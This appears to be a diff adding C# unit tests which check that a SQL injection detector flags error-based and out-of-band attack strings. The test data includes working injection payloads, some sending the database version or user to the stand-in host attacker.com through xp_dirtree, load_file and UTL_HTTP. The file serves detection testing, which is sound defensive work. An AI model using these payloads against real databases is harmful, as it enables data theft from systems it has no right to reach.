@@ -521,4 +521,42 @@ public sealed class SqlInjectDetectorTests
             Assert.IsFalse(SqlInjectDetector.ContainsSqlInjection(input), $"Input '{input}' should be valid");
         }
     }
+
+    [TestMethod]
+    public void ContainsSqlInjection_ErrorBasedAttacks_ReturnsTrue()
+    {
+        // Arrange
+        var errorBasedAttacks = new[]
+        {
+            "' AND 1=CONVERT(int, @@version)--",
+            "' OR 1=1/(SELECT 0)",
+            "' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT @@version), 0x7e, FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)",
+            "' OR 1 IN (SELECT (CHAR(113)+CHAR(120)+CHAR(112)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (1=1) THEN 1 ELSE 0 END))+CHAR(113)+CHAR(122)+CHAR(112)+CHAR(120)+CHAR(113)))"
+        };
+
+        // Act & Assert
+        foreach (var attack in errorBasedAttacks)
+        {
+            Assert.IsTrue(SqlInjectDetector.ContainsSqlInjection(attack), $"Error-based attack '{attack}' should be detected");
+        }
+    }
+
+    [TestMethod]
+    public void ContainsSqlInjection_OutOfBandAttacks_ReturnsTrue()
+    {
+        // Arrange
+        var outOfBandAttacks = new[]
+        {
+            "' OR 1=1; EXEC master..xp_dirtree '//attacker.com/share'; --",
+            "' OR (SELECT load_file('\\\\attacker.com\\share\\test.txt'))",
+            "' AND 1=UTL_HTTP.REQUEST('http://attacker.com/' || (SELECT user FROM DUAL)) --",
+            "' OR 1=1; DECLARE @p VARCHAR(1024); SELECT @p = (SELECT CONVERT(varchar(255), @@version)); EXEC('master..xp_dirtree ''\\\\' + @p + '.attacker.com\\foo'''); --"
+        };
+
+        // Act & Assert
+        foreach (var attack in outOfBandAttacks)
+        {
+            Assert.IsTrue(SqlInjectDetector.ContainsSqlInjection(attack), $"Out-of-band attack '{attack}' should be detected");
+        }
+    }
 }
